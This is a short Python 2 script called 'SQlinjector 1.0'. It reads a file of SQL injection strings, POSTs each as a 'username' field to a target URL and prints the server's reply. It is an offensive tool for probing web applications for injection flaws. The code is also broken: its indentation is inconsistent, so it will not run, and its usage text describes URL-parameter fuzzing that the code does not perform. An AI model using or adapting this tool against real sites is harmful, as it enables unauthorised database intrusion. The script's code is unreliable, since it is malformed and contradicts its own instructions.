import requests
import sys
import getopt
import re
import urllib, urllib2
from termcolor import colored


def banner():
    print "\n***************************************"
    print "* SQlinjector  1.0                      *"
    print "***************************************"

def usage():
    print "Usage:"
    print "     -w: url (http://somesite.com/news.php?id=FUZZ)\n"
    print "     -i: injection strings file \n"
    print "example: SQLinjector.py -w http://www.somesite.com/news.php?id=FUZZ \n"


def start(argv):
    banner()
    if len(sys.argv) < 2:
       usage()
       sys.exit()
    try:
        opts, args = getopt.getopt(argv,"w:i:")
    except getopt.GetoptError:
        print "Error en arguments"
        sys.exit()
    for opt,arg in opts :
        if opt == '-w' :
            url=arg
        elif opt == '-i':
            dictio = arg
    try:
        print "[-] Opening injections file: " + dictio
        f = open(dictio, "r")
        name = f.read().splitlines()
    except:
        print"Failed opening file: "+ dictio+"\n"
        sys.exit()
    launcher(url,name)

def launcher (url,dictio):
    injected = []

    for x in dictio:
        sqlinjection=x
                values = {'username':sqlinjection }
                data = urllib.urlencode(values)
                #full_url = url_2+'?'+data
                #submit the form
                req = urllib2.Request(url,data)
                rsp = urllib2.urlopen(req)
                #read the return result
                html = rsp.read()

                print colored('[+] Detection results:','green')
            print "------------------"
                print html
if __name__ == "__main__":
    try:
        start(sys.argv[1:])
    except KeyboardInterrupt:
        print "SQLinjector interrupted by user..!!"